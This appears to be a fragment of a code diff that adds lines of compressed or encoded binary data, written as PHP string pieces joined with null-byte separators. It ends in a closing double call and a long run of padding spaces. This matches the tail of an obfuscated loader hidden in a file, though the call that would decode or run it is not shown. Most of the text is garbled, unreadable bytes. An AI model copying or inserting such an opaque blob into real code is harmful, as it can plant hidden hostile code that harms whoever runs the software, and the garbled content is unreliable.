+st16F�����k��w��9��P�l{\'P�*HsY�^�حjc�aS�[1�' . "\0" . '*Wۿ��2Cp' . "\0" . '䕶{ر]�Db��u�� I��w<s?��ݨKX^�.�#�h��Z�iF��QA���6�&��#��.!���Wq�0��/̮N��͘�o�E�rRK��N%����"=�����z+��;Q3�f����R���i�����(����\'����������R9B\\*^����-�̃���N���\\w�-KӤ�D�4���
+�\\����!m�����TV���,Ă�t���$L��ݮ�������Ʈ>��2�}�j��7�jҖ�QO<�d�!�[k+��8��k�O��
+�Ѯ�F��P5����
+{a�Isw��b儋
+9���F"Uk��M�3�:
+���=�ZW���#��	�L�?�<�6Y������Ɯ#��FZq4�8�ۯz����!p��ґ/���&�ϼ7,���^��]�����\\sI#�!sTVMn����Ip)h�<��;�{N2On>�u��o�/4�Ө�+<=��8��$��$����1'));                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
